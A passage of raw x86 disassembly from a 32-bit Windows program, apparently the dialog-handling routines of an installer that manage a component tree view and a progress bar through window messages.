  404b24:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  404b28:	f6 47 f0 02          	testb  $0x2,-0x10(%edi)
  404b2c:	c7 44 24 30 02 00 ff 	movl   $0xffff0002,0x30(%esp)
  404b33:	ff 
  404b34:	c7 44 24 34 0d 00 00 	movl   $0xd,0x34(%esp)
  404b3b:	00 
  404b3c:	89 54 24 40          	mov    %edx,0x40(%esp)
  404b40:	89 74 24 58          	mov    %esi,0x58(%esp)
  404b44:	89 7c 24 44          	mov    %edi,0x44(%esp)
  404b48:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  404b4c:	74 36                	je     0x404b84
  404b4e:	33 c0                	xor    %eax,%eax
  404b50:	c7 44 24 34 4d 00 00 	movl   $0x4d,0x34(%esp)
  404b57:	00 
  404b58:	40                   	inc    %eax
  404b59:	89 44 24 54          	mov    %eax,0x54(%esp)
  404b5d:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  404b61:	50                   	push   %eax
  404b62:	51                   	push   %ecx
  404b63:	68 32 11 00 00       	push   $0x1132
  404b68:	55                   	push   %ebp
  404b69:	ff 15 64 92 40 00    	call   *0x409264
  404b6f:	8b d8                	mov    %eax,%ebx
  404b71:	a1 6c 9d 45 00       	mov    0x459d6c,%eax
  404b76:	89 1c b0             	mov    %ebx,(%eax,%esi,4)
  404b79:	33 c0                	xor    %eax,%eax
  404b7b:	40                   	inc    %eax
  404b7c:	33 c9                	xor    %ecx,%ecx
  404b7e:	89 44 24 18          	mov    %eax,0x18(%esp)
  404b82:	eb 3a                	jmp    0x404bbe
  404b84:	f6 47 f0 04          	testb  $0x4,-0x10(%edi)
  404b88:	74 13                	je     0x404b9d
  404b8a:	53                   	push   %ebx
  404b8b:	6a 03                	push   $0x3
  404b8d:	68 0a 11 00 00       	push   $0x110a
  404b92:	55                   	push   %ebp
  404b93:	ff 15 64 92 40 00    	call   *0x409264
  404b99:	8b d8                	mov    %eax,%ebx
  404b9b:	eb 1b                	jmp    0x404bb8
  404b9d:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  404ba1:	50                   	push   %eax
  404ba2:	51                   	push   %ecx
  404ba3:	68 32 11 00 00       	push   $0x1132
  404ba8:	55                   	push   %ebp
  404ba9:	ff 15 64 92 40 00    	call   *0x409264
  404baf:	8b 0d 6c 9d 45 00    	mov    0x459d6c,%ecx
  404bb5:	89 04 b1             	mov    %eax,(%ecx,%esi,4)
  404bb8:	33 c9                	xor    %ecx,%ecx
  404bba:	8b 44 24 18          	mov    0x18(%esp),%eax
  404bbe:	46                   	inc    %esi
  404bbf:	81 c7 18 40 00 00    	add    $0x4018,%edi
  404bc5:	3b 35 4c e2 47 00    	cmp    0x47e24c,%esi
  404bcb:	0f 8c 42 ff ff ff    	jl     0x404b13
  404bd1:	85 c0                	test   %eax,%eax
  404bd3:	75 16                	jne    0x404beb
  404bd5:	6a f0                	push   $0xfffffff0
  404bd7:	55                   	push   %ebp
  404bd8:	ff 15 a8 91 40 00    	call   *0x4091a8
  404bde:	83 e0 fb             	and    $0xfffffffb,%eax
  404be1:	50                   	push   %eax
  404be2:	6a f0                	push   $0xfffffff0
  404be4:	55                   	push   %ebp
  404be5:	ff 15 38 92 40 00    	call   *0x409238
  404beb:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  404bf0:	75 10                	jne    0x404c02
  404bf2:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  404bf6:	6a 05                	push   $0x5
  404bf8:	57                   	push   %edi
  404bf9:	ff 15 54 92 40 00    	call   *0x409254
  404bff:	57                   	push   %edi
  404c00:	eb 01                	jmp    0x404c03
  404c02:	55                   	push   %ebp
  404c03:	e8 77 0e 00 00       	call   0x405a7f
  404c08:	b9 0f 04 00 00       	mov    $0x40f,%ecx
  404c0d:	8d 51 f6             	lea    -0xa(%ecx),%edx
  404c10:	39 54 24 6c          	cmp    %edx,0x6c(%esp)
  404c14:	0f 45 4c 24 6c       	cmovne 0x6c(%esp),%ecx
  404c19:	33 c0                	xor    %eax,%eax
  404c1b:	39 54 24 6c          	cmp    %edx,0x6c(%esp)
  404c1f:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  404c23:	0f 45 44 24 70       	cmovne 0x70(%esp),%eax
  404c28:	33 f6                	xor    %esi,%esi
  404c2a:	46                   	inc    %esi
  404c2b:	89 44 24 70          	mov    %eax,0x70(%esp)
  404c2f:	39 54 24 6c          	cmp    %edx,0x6c(%esp)
  404c33:	0f 45 74 24 74       	cmovne 0x74(%esp),%esi
  404c38:	83 c2 0e             	add    $0xe,%edx
  404c3b:	83 f9 4e             	cmp    $0x4e,%ecx
  404c3e:	74 0e                	je     0x404c4e
  404c40:	8b fe                	mov    %esi,%edi
  404c42:	8b e8                	mov    %eax,%ebp
  404c44:	8b d9                	mov    %ecx,%ebx
  404c46:	3b ca                	cmp    %edx,%ecx
  404c48:	0f 85 13 01 00 00    	jne    0x404d61
  404c4e:	3b ca                	cmp    %edx,%ecx
  404c50:	74 13                	je     0x404c65
  404c52:	81 7e 04 08 04 00 00 	cmpl   $0x408,0x4(%esi)
  404c59:	8b fe                	mov    %esi,%edi
  404c5b:	8b e8                	mov    %eax,%ebp
  404c5d:	8b d9                	mov    %ecx,%ebx
  404c5f:	0f 85 fc 00 00 00    	jne    0x404d61
  404c65:	f7 05 2c e2 47 00 00 	testl  $0x200,0x47e22c
  404c6c:	02 00 00 
  404c6f:	8b fe                	mov    %esi,%edi
  404c71:	8b e8                	mov    %eax,%ebp
  404c73:	8b d9                	mov    %ecx,%ebx
  404c75:	0f 85 9e 00 00 00    	jne    0x404d19
  404c7b:	3b ca                	cmp    %edx,%ecx
  404c7d:	74 0a                	je     0x404c89
  404c7f:	83 7e 08 fe          	cmpl   $0xfffffffe,0x8(%esi)
  404c83:	0f 85 90 00 00 00    	jne    0x404d19
  404c89:	33 c0                	xor    %eax,%eax
  404c8b:	3b ca                	cmp    %edx,%ecx
  404c8d:	0f 95 c0             	setne  %al
  404c90:	50                   	push   %eax
  404c91:	ff 74 24 14          	push   0x14(%esp)
  404c95:	e8 bc 0f 00 00       	call   0x405c56
  404c9a:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  404c9e:	8b d0                	mov    %eax,%edx
  404ca0:	8b 44 24 70          	mov    0x70(%esp),%eax
  404ca4:	8b fe                	mov    %esi,%edi
  404ca6:	89 54 24 74          	mov    %edx,0x74(%esp)
  404caa:	8b e8                	mov    %eax,%ebp
  404cac:	8b d9                	mov    %ecx,%ebx
  404cae:	85 d2                	test   %edx,%edx
  404cb0:	78 67                	js     0x404d19
  404cb2:	8b 7c 24 14          	mov    0x14(%esp),%edi
  404cb6:	69 d2 18 40 00 00    	imul   $0x4018,%edx,%edx
  404cbc:	89 54 24 6c          	mov    %edx,0x6c(%esp)
  404cc0:	8b 54 3a 08          	mov    0x8(%edx,%edi,1),%edx
  404cc4:	8b fe                	mov    %esi,%edi
  404cc6:	f6 c2 10             	test   $0x10,%dl
  404cc9:	75 4e                	jne    0x404d19
  404ccb:	f6 c2 40             	test   $0x40,%dl
  404cce:	74 18                	je     0x404ce8
  404cd0:	81 f2 80 00 00 00    	xor    $0x80,%edx
  404cd6:	8b c2                	mov    %edx,%eax
  404cd8:	8b ca                	mov    %edx,%ecx
  404cda:	83 e0 fe             	and    $0xfffffffe,%eax
  404cdd:	83 ca 01             	or     $0x1,%edx
  404ce0:	f6 c1 80             	test   $0x80,%cl
  404ce3:	0f 44 d0             	cmove  %eax,%edx
  404ce6:	eb 05                	jmp    0x404ced
  404ce8:	33 c0                	xor    %eax,%eax
  404cea:	40                   	inc    %eax
  404ceb:	33 d0                	xor    %eax,%edx
  404ced:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  404cf1:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404cf5:	8b 6c 24 74          	mov    0x74(%esp),%ebp
  404cf9:	55                   	push   %ebp
  404cfa:	89 54 08 08          	mov    %edx,0x8(%eax,%ecx,1)
  404cfe:	e8 1e c5 ff ff       	call   0x401221
  404d03:	8b 3d 2c e2 47 00    	mov    0x47e22c,%edi
  404d09:	33 c0                	xor    %eax,%eax
  404d0b:	c1 ef 08             	shr    $0x8,%edi
  404d0e:	40                   	inc    %eax
  404d0f:	f7 d7                	not    %edi
  404d11:	45                   	inc    %ebp
  404d12:	23 f8                	and    %eax,%edi
  404d14:	bb 0f 04 00 00       	mov    $0x40f,%ebx
  404d19:	85 f6                	test   %esi,%esi
  404d1b:	74 44                	je     0x404d61
  404d1d:	81 7e 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%esi)
  404d24:	75 15                	jne    0x404d3b
  404d26:	ff 76 5c             	push   0x5c(%esi)
  404d29:	33 c0                	xor    %eax,%eax
  404d2b:	50                   	push   %eax
  404d2c:	68 19 04 00 00       	push   $0x419
  404d31:	ff 74 24 1c          	push   0x1c(%esp)
  404d35:	ff 15 64 92 40 00    	call   *0x409264
  404d3b:	81 7e 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%esi)
  404d42:	75 1d                	jne    0x404d61
  404d44:	69 46 5c 18 40 00 00 	imul   $0x4018,0x5c(%esi),%eax
  404d4b:	83 7e 0c 02          	cmpl   $0x2,0xc(%esi)
  404d4f:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404d53:	75 07                	jne    0x404d5c
  404d55:	83 4c 08 08 20       	orl    $0x20,0x8(%eax,%ecx,1)
  404d5a:	eb 05                	jmp    0x404d61
  404d5c:	83 64 08 08 df       	andl   $0xffffffdf,0x8(%eax,%ecx,1)
  404d61:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  404d67:	0f 85 88 00 00 00    	jne    0x404df5
  404d6d:	b8 f9 03 00 00       	mov    $0x3f9,%eax
  404d72:	66 3b e8             	cmp    %ax,%bp
  404d75:	75 7e                	jne    0x404df5
  404d77:	33 c9                	xor    %ecx,%ecx
  404d79:	8b c5                	mov    %ebp,%eax
  404d7b:	c1 e8 10             	shr    $0x10,%eax
  404d7e:	41                   	inc    %ecx
  404d7f:	66 3b c1             	cmp    %cx,%ax
  404d82:	75 71                	jne    0x404df5
  404d84:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  404d88:	33 c0                	xor    %eax,%eax
  404d8a:	50                   	push   %eax
  404d8b:	50                   	push   %eax
  404d8c:	68 47 01 00 00       	push   $0x147
  404d91:	56                   	push   %esi
  404d92:	ff 15 64 92 40 00    	call   *0x409264
  404d98:	83 f8 ff             	cmp    $0xffffffff,%eax
  404d9b:	74 58                	je     0x404df5
  404d9d:	8b 1d 64 92 40 00    	mov    0x409264,%ebx
  404da3:	33 ff                	xor    %edi,%edi
  404da5:	57                   	push   %edi
  404da6:	50                   	push   %eax
  404da7:	68 50 01 00 00       	push   $0x150
  404dac:	56                   	push   %esi
  404dad:	ff d3                	call   *%ebx
  404daf:	8b f0                	mov    %eax,%esi
  404db1:	83 fe ff             	cmp    $0xffffffff,%esi
  404db4:	74 0d                	je     0x404dc3
  404db6:	8b 44 24 20          	mov    0x20(%esp),%eax
  404dba:	39 bc b0 94 00 00 00 	cmp    %edi,0x94(%eax,%esi,4)
  404dc1:	75 03                	jne    0x404dc6
  404dc3:	6a 20                	push   $0x20
  404dc5:	5e                   	pop    %esi
  404dc6:	56                   	push   %esi
  404dc7:	e8 c4 c4 ff ff       	call   0x401290
  404dcc:	56                   	push   %esi
  404dcd:	57                   	push   %edi
  404dce:	68 20 04 00 00       	push   $0x420
  404dd3:	ff 74 24 74          	push   0x74(%esp)
  404dd7:	ff d3                	call   *%ebx
  404dd9:	83 cd ff             	or     $0xffffffff,%ebp
  404ddc:	89 7c 24 18          	mov    %edi,0x18(%esp)
  404de0:	bb 0f 04 00 00       	mov    $0x40f,%ebx
  404de5:	89 6c 24 24          	mov    %ebp,0x24(%esp)
  404de9:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  404ded:	83 ce ff             	or     $0xffffffff,%esi
  404df0:	e9 99 00 00 00       	jmp    0x404e8e
  404df5:	ba 00 02 00 00       	mov    $0x200,%edx
  404dfa:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  404dfe:	8b c5                	mov    %ebp,%eax
  404e00:	8b cf                	mov    %edi,%ecx
  404e02:	89 44 24 74          	mov    %eax,0x74(%esp)
  404e06:	8b f3                	mov    %ebx,%esi
  404e08:	89 4c 24 6c          	mov    %ecx,0x6c(%esp)
  404e0c:	3b da                	cmp    %edx,%ebx
  404e0e:	75 14                	jne    0x404e24
  404e10:	33 c0                	xor    %eax,%eax
  404e12:	50                   	push   %eax
  404e13:	50                   	push   %eax
  404e14:	52                   	push   %edx
  404e15:	ff 74 24 1c          	push   0x1c(%esp)
  404e19:	ff 15 64 92 40 00    	call   *0x409264
  404e1f:	e9 5b 02 00 00       	jmp    0x40507f
  404e24:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  404e28:	8b e8                	mov    %eax,%ebp
  404e2a:	89 6c 24 24          	mov    %ebp,0x24(%esp)
  404e2e:	8b de                	mov    %esi,%ebx
  404e30:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  404e34:	8b f9                	mov    %ecx,%edi
  404e36:	81 fe 0b 04 00 00    	cmp    $0x40b,%esi
  404e3c:	75 40                	jne    0x404e7e
  404e3e:	a1 70 9d 45 00       	mov    0x459d70,%eax
  404e43:	85 c0                	test   %eax,%eax
  404e45:	74 07                	je     0x404e4e
  404e47:	50                   	push   %eax
  404e48:	ff 15 3c 90 40 00    	call   *0x40903c
  404e4e:	a1 6c 9d 45 00       	mov    0x459d6c,%eax
  404e53:	85 c0                	test   %eax,%eax
  404e55:	74 07                	je     0x404e5e
  404e57:	50                   	push   %eax
  404e58:	ff 15 f4 90 40 00    	call   *0x4090f4
  404e5e:	8b 7c 24 6c          	mov    0x6c(%esp),%edi
  404e62:	33 c0                	xor    %eax,%eax
  404e64:	8b 6c 24 74          	mov    0x74(%esp),%ebp
  404e68:	8b de                	mov    %esi,%ebx
  404e6a:	a3 70 9d 45 00       	mov    %eax,0x459d70
  404e6f:	a3 6c 9d 45 00       	mov    %eax,0x459d6c
  404e74:	a3 d8 e2 47 00       	mov    %eax,0x47e2d8
  404e79:	e9 01 02 00 00       	jmp    0x40507f
  404e7e:	81 fb 0f 04 00 00    	cmp    $0x40f,%ebx
  404e84:	0f 85 b4 01 00 00    	jne    0x40503e
  404e8a:	8b 74 24 28          	mov    0x28(%esp),%esi
  404e8e:	33 c0                	xor    %eax,%eax
  404e90:	50                   	push   %eax
  404e91:	50                   	push   %eax
  404e92:	e8 46 c4 ff ff       	call   0x4012dd
  404e97:	85 ed                	test   %ebp,%ebp
  404e99:	74 11                	je     0x404eac
  404e9b:	83 fd ff             	cmp    $0xffffffff,%ebp
  404e9e:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404ea1:	0f 44 c6             	cmove  %esi,%eax
  404ea4:	50                   	push   %eax
  404ea5:	6a 08                	push   $0x8
  404ea7:	e8 86 0b 00 00       	call   0x405a32
  404eac:	85 ff                	test   %edi,%edi
  404eae:	74 53                	je     0x404f03
  404eb0:	ff 35 6c 9d 45 00    	push   0x459d6c
  404eb6:	e8 e5 c2 ff ff       	call   0x4011a0
  404ebb:	8b f8                	mov    %eax,%edi
  404ebd:	57                   	push   %edi
  404ebe:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  404ec2:	e8 c9 c3 ff ff       	call   0x401290
  404ec7:	33 db                	xor    %ebx,%ebx
  404ec9:	8b cb                	mov    %ebx,%ecx
  404ecb:	8b d3                	mov    %ebx,%edx
  404ecd:	85 ff                	test   %edi,%edi
  404ecf:	7e 18                	jle    0x404ee9
  404ed1:	8b 74 24 20          	mov    0x20(%esp),%esi
  404ed5:	39 9c 96 94 00 00 00 	cmp    %ebx,0x94(%esi,%edx,4)
  404edc:	8d 41 01             	lea    0x1(%ecx),%eax
  404edf:	0f 44 c1             	cmove  %ecx,%eax
  404ee2:	42                   	inc    %edx
  404ee3:	8b c8                	mov    %eax,%ecx
  404ee5:	3b d7                	cmp    %edi,%edx
  404ee7:	7c ec                	jl     0x404ed5
  404ee9:	53                   	push   %ebx
  404eea:	51                   	push   %ecx
  404eeb:	68 4e 01 00 00       	push   $0x14e
  404ef0:	ff 74 24 28          	push   0x28(%esp)
  404ef4:	ff 15 64 92 40 00    	call   *0x409264
  404efa:	bb 20 04 00 00       	mov    $0x420,%ebx
  404eff:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  404f03:	33 f6                	xor    %esi,%esi
  404f05:	56                   	push   %esi
  404f06:	56                   	push   %esi
  404f07:	e8 d1 c3 ff ff       	call   0x4012dd
  404f0c:	8b 0d 4c e2 47 00    	mov    0x47e24c,%ecx
  404f12:	a1 6c 9d 45 00       	mov    0x459d6c,%eax
  404f17:	89 74 24 6c          	mov    %esi,0x6c(%esp)
  404f1b:	8b 35 48 e2 47 00    	mov    0x47e248,%esi
  404f21:	c7 44 24 38 30 f0 00 	movl   $0xf030,0x38(%esp)
  404f28:	00 
  404f29:	85 c9                	test   %ecx,%ecx
  404f2b:	0f 8e cf 00 00 00    	jle    0x405000
  404f31:	8b 6c 24 6c          	mov    0x6c(%esp),%ebp
  404f35:	83 c6 08             	add    $0x8,%esi
  404f38:	8b 7c 24 10          	mov    0x10(%esp),%edi
  404f3c:	8b d8                	mov    %eax,%ebx
  404f3e:	8b 04 ab             	mov    (%ebx,%ebp,4),%eax
  404f41:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  404f45:	85 c0                	test   %eax,%eax
  404f47:	0f 84 98 00 00 00    	je     0x404fe5
  404f4d:	8b 16                	mov    (%esi),%edx
  404f4f:	89 44 24 30          	mov    %eax,0x30(%esp)
  404f53:	c7 44 24 2c 08 00 00 	movl   $0x8,0x2c(%esp)
  404f5a:	00 
  404f5b:	f7 c2 00 01 00 00    	test   $0x100,%edx
  404f61:	74 1d                	je     0x404f80
  404f63:	8d 46 10             	lea    0x10(%esi),%eax
  404f66:	c7 44 24 2c 09 00 00 	movl   $0x9,0x2c(%esp)
  404f6d:	00 
  404f6e:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  404f72:	81 26 ff fe ff ff    	andl   $0xfffffeff,(%esi)
  404f78:	8b 44 24 30          	mov    0x30(%esp),%eax
  404f7c:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  404f80:	f6 c2 40             	test   $0x40,%dl
  404f83:	74 05                	je     0x404f8a
  404f85:	6a 03                	push   $0x3
  404f87:	59                   	pop    %ecx
  404f88:	eb 10                	jmp    0x404f9a
  404f8a:	33 c0                	xor    %eax,%eax
  404f8c:	8b ca                	mov    %edx,%ecx
  404f8e:	40                   	inc    %eax
  404f8f:	23 c8                	and    %eax,%ecx
  404f91:	41                   	inc    %ecx
  404f92:	f6 c2 10             	test   $0x10,%dl
  404f95:	74 03                	je     0x404f9a
  404f97:	83 c1 03             	add    $0x3,%ecx
  404f9a:	ff 74 24 6c          	push   0x6c(%esp)
  404f9e:	8b c2                	mov    %edx,%eax
  404fa0:	c1 e1 0b             	shl    $0xb,%ecx
  404fa3:	83 e0 08             	and    $0x8,%eax
  404fa6:	0b c8                	or     %eax,%ecx
  404fa8:	8b c2                	mov    %edx,%eax
  404faa:	83 e0 20             	and    $0x20,%eax
  404fad:	c1 fa 05             	sar    $0x5,%edx
  404fb0:	03 c9                	add    %ecx,%ecx
  404fb2:	0b c8                	or     %eax,%ecx
  404fb4:	33 c0                	xor    %eax,%eax
  404fb6:	40                   	inc    %eax
  404fb7:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  404fbb:	23 d0                	and    %eax,%edx
  404fbd:	42                   	inc    %edx
  404fbe:	52                   	push   %edx
  404fbf:	68 02 11 00 00       	push   $0x1102
  404fc4:	57                   	push   %edi
  404fc5:	ff 15 64 92 40 00    	call   *0x409264
  404fcb:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  404fcf:	50                   	push   %eax
  404fd0:	33 c0                	xor    %eax,%eax
  404fd2:	50                   	push   %eax
  404fd3:	68 3f 11 00 00       	push   $0x113f
  404fd8:	57                   	push   %edi
  404fd9:	ff 15 64 92 40 00    	call   *0x409264
  404fdf:	8b 0d 4c e2 47 00    	mov    0x47e24c,%ecx
  404fe5:	45                   	inc    %ebp
  404fe6:	81 c6 18 40 00 00    	add    $0x4018,%esi
  404fec:	3b e9                	cmp    %ecx,%ebp
  404fee:	0f 8c 4a ff ff ff    	jl     0x404f3e
  404ff4:	8b 7c 24 18          	mov    0x18(%esp),%edi
  404ff8:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  404ffc:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  405000:	b8 00 04 00 00       	mov    $0x400,%eax
  405005:	33 f6                	xor    %esi,%esi
  405007:	66 39 05 1e e3 47 00 	cmp    %ax,0x47e31e
  40500e:	75 0f                	jne    0x40501f
  405010:	33 c0                	xor    %eax,%eax
  405012:	40                   	inc    %eax
  405013:	50                   	push   %eax
  405014:	56                   	push   %esi
  405015:	ff 74 24 18          	push   0x18(%esp)
  405019:	ff 15 3c 92 40 00    	call   *0x40923c
  40501f:	a1 00 62 47 00       	mov    0x476200,%eax
  405024:	39 70 10             	cmp    %esi,0x10(%eax)
  405027:	74 15                	je     0x40503e
  405029:	6a 05                	push   $0x5
  40502b:	e8 76 0d 00 00       	call   0x405da6
  405030:	56                   	push   %esi
  405031:	50                   	push   %eax
  405032:	6a fb                	push   $0xfffffffb
  405034:	68 ff 03 00 00       	push   $0x3ff
  405039:	e8 9e 0a 00 00       	call   0x405adc
  40503e:	81 fb 20 04 00 00    	cmp    $0x420,%ebx
  405044:	75 39                	jne    0x40507f
  405046:	f7 05 2c e2 47 00 00 	testl  $0x100,0x47e22c
  40504d:	01 00 00 
  405050:	74 2d                	je     0x40507f
  405052:	6a 08                	push   $0x8
  405054:	33 f6                	xor    %esi,%esi
  405056:	83 ff 20             	cmp    $0x20,%edi
  405059:	58                   	pop    %eax
  40505a:	0f 44 f0             	cmove  %eax,%esi
  40505d:	56                   	push   %esi
  40505e:	ff 74 24 14          	push   0x14(%esp)
  405062:	ff 15 54 92 40 00    	call   *0x409254
  405068:	56                   	push   %esi
  405069:	68 fe 03 00 00       	push   $0x3fe
  40506e:	ff 74 24 70          	push   0x70(%esp)
  405072:	ff 15 50 92 40 00    	call   *0x409250
  405078:	50                   	push   %eax
  405079:	ff 15 54 92 40 00    	call   *0x409254
  40507f:	57                   	push   %edi
  405080:	55                   	push   %ebp
  405081:	53                   	push   %ebx
  405082:	e8 50 0c 00 00       	call   0x405cd7
  405087:	5f                   	pop    %edi
  405088:	5e                   	pop    %esi
  405089:	5d                   	pop    %ebp
  40508a:	5b                   	pop    %ebx
  40508b:	83 c4 54             	add    $0x54,%esp
  40508e:	c2 10 00             	ret    $0x10
  405091:	83 ec 4c             	sub    $0x4c,%esp
  405094:	53                   	push   %ebx
  405095:	8b 1d 08 62 47 00    	mov    0x476208,%ebx
  40509b:	55                   	push   %ebp
  40509c:	56                   	push   %esi
  40509d:	57                   	push   %edi
  40509e:	8b 7c 24 64          	mov    0x64(%esp),%edi
  4050a2:	81 ff 10 01 00 00    	cmp    $0x110,%edi
  4050a8:	0f 85 a7 01 00 00    	jne    0x405255
  4050ae:	83 4c 24 34 ff       	orl    $0xffffffff,0x34(%esp)
  4050b3:	8d 7c 24 38          	lea    0x38(%esp),%edi
  4050b7:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%esp)
  4050be:	00 
  4050bf:	33 c0                	xor    %eax,%eax
  4050c1:	33 f6                	xor    %esi,%esi
  4050c3:	8b 1d 50 92 40 00    	mov    0x409250,%ebx
  4050c9:	89 74 24 24          	mov    %esi,0x24(%esp)
  4050cd:	89 74 24 2c          	mov    %esi,0x2c(%esp)
  4050d1:	89 74 24 30          	mov    %esi,0x30(%esp)
  4050d5:	ab                   	stos   %eax,%es:(%edi)
  4050d6:	68 03 04 00 00       	push   $0x403
  4050db:	ff 74 24 64          	push   0x64(%esp)
  4050df:	ab                   	stos   %eax,%es:(%edi)
  4050e0:	ab                   	stos   %eax,%es:(%edi)
  4050e1:	ab                   	stos   %eax,%es:(%edi)
  4050e2:	ab                   	stos   %eax,%es:(%edi)
  4050e3:	a1 30 e2 47 00       	mov    0x47e230,%eax
  4050e8:	8b 68 5c             	mov    0x5c(%eax),%ebp
  4050eb:	8b 40 60             	mov    0x60(%eax),%eax
  4050ee:	89 44 24 70          	mov    %eax,0x70(%esp)
  4050f2:	ff d3                	call   *%ebx
  4050f4:	68 ee 03 00 00       	push   $0x3ee
  4050f9:	ff 74 24 64          	push   0x64(%esp)
  4050fd:	a3 04 62 47 00       	mov    %eax,0x476204
  405102:	ff d3                	call   *%ebx
  405104:	68 f8 03 00 00       	push   $0x3f8
  405109:	ff 74 24 64          	push   0x64(%esp)
  40510d:	a3 e8 61 47 00       	mov    %eax,0x4761e8
  405112:	ff d3                	call   *%ebx
  405114:	ff 35 04 62 47 00    	push   0x476204
  40511a:	8b d8                	mov    %eax,%ebx
  40511c:	89 1d 08 62 47 00    	mov    %ebx,0x476208
  405122:	e8 58 09 00 00       	call   0x405a7f
  405127:	6a 04                	push   $0x4
  405129:	e8 78 0c 00 00       	call   0x405da6
  40512e:	68 00 30 4d 00       	push   $0x4d3000
  405133:	6a fd                	push   $0xfffffffd
  405135:	56                   	push   %esi
  405136:	a3 ec 61 47 00       	mov    %eax,0x4761ec
  40513b:	89 35 f0 61 47 00    	mov    %esi,0x4761f0
  405141:	e8 4b 13 00 00       	call   0x406491
  405146:	50                   	push   %eax
  405147:	68 c4 a4 40 00       	push   $0x40a4c4
  40514c:	e8 d3 1c 00 00       	call   0x406e24
  405151:	83 c4 0c             	add    $0xc,%esp
  405154:	8d 44 24 10          	lea    0x10(%esp),%eax
  405158:	50                   	push   %eax
  405159:	53                   	push   %ebx
  40515a:	ff 15 70 92 40 00    	call   *0x409270
  405160:	6a 02                	push   $0x2
  405162:	ff 15 d0 91 40 00    	call   *0x4091d0
  405168:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40516c:	8b 3d 64 92 40 00    	mov    0x409264,%edi
  405172:	2b c8                	sub    %eax,%ecx
  405174:	8d 44 24 20          	lea    0x20(%esp),%eax
  405178:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  40517c:	50                   	push   %eax
  40517d:	56                   	push   %esi
  40517e:	68 61 10 00 00       	push   $0x1061
  405183:	53                   	push   %ebx
  405184:	ff d7                	call   *%edi
  405186:	b8 00 40 00 00       	mov    $0x4000,%eax
  40518b:	50                   	push   %eax
  40518c:	50                   	push   %eax
  40518d:	68 36 10 00 00       	push   $0x1036
  405192:	53                   	push   %ebx
  405193:	ff d7                	call   *%edi
  405195:	85 ed                	test   %ebp,%ebp
  405197:	78 14                	js     0x4051ad
  405199:	55                   	push   %ebp
  40519a:	56                   	push   %esi
  40519b:	68 01 10 00 00       	push   $0x1001
  4051a0:	53                   	push   %ebx
  4051a1:	ff d7                	call   *%edi
  4051a3:	55                   	push   %ebp
  4051a4:	56                   	push   %esi
  4051a5:	68 26 10 00 00       	push   $0x1026
  4051aa:	53                   	push   %ebx
  4051ab:	ff d7                	call   *%edi
  4051ad:	8b 44 24 68          	mov    0x68(%esp),%eax
  4051b1:	85 c0                	test   %eax,%eax
  4051b3:	78 0a                	js     0x4051bf
  4051b5:	50                   	push   %eax
  4051b6:	56                   	push   %esi
  4051b7:	68 24 10 00 00       	push   $0x1024
  4051bc:	53                   	push   %ebx
  4051bd:	ff d7                	call   *%edi
  4051bf:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  4051c3:	ff 70 30             	push   0x30(%eax)
  4051c6:	6a 1b                	push   $0x1b
  4051c8:	ff 74 24 68          	push   0x68(%esp)
  4051cc:	e8 c5 08 00 00       	call   0x405a96
  4051d1:	f6 05 2c e2 47 00 03 	testb  $0x3,0x47e22c
  4051d8:	74 32                	je     0x40520c
  4051da:	56                   	push   %esi
  4051db:	ff 35 04 62 47 00    	push   0x476204
  4051e1:	ff 15 54 92 40 00    	call   *0x409254
  4051e7:	f6 05 2c e2 47 00 02 	testb  $0x2,0x47e22c
  4051ee:	75 0b                	jne    0x4051fb
  4051f0:	6a 08                	push   $0x8
  4051f2:	53                   	push   %ebx
  4051f3:	ff 15 54 92 40 00    	call   *0x409254
  4051f9:	eb 06                	jmp    0x405201
  4051fb:	89 35 04 62 47 00    	mov    %esi,0x476204
  405201:	ff 35 e8 61 47 00    	push   0x4761e8
  405207:	e8 73 08 00 00       	call   0x405a7f
  40520c:	68 ec 03 00 00       	push   $0x3ec
  405211:	ff 74 24 64          	push   0x64(%esp)
  405215:	ff 15 50 92 40 00    	call   *0x409250
  40521b:	68 00 00 30 75       	push   $0x75300000
  405220:	56                   	push   %esi
  405221:	8b d8                	mov    %eax,%ebx
  405223:	68 01 04 00 00       	push   $0x401
  405228:	53                   	push   %ebx
  405229:	ff d7                	call   *%edi
  40522b:	f6 05 2c e2 47 00 04 	testb  $0x4,0x47e22c
  405232:	0f 84 29 02 00 00    	je     0x405461
  405238:	8b 44 24 68          	mov    0x68(%esp),%eax
  40523c:	50                   	push   %eax
  40523d:	56                   	push   %esi
  40523e:	68 09 04 00 00       	push   $0x409
  405243:	53                   	push   %ebx
  405244:	ff d7                	call   *%edi
  405246:	55                   	push   %ebp
  405247:	56                   	push   %esi
  405248:	68 01 20 00 00       	push   $0x2001
  40524d:	53                   	push   %ebx
  40524e:	ff d7                	call   *%edi
  405250:	e9 0c 02 00 00       	jmp    0x405461
  405255:	81 ff 05 04 00 00    	cmp    $0x405,%edi
  40525b:	75 44                	jne    0x4052a1
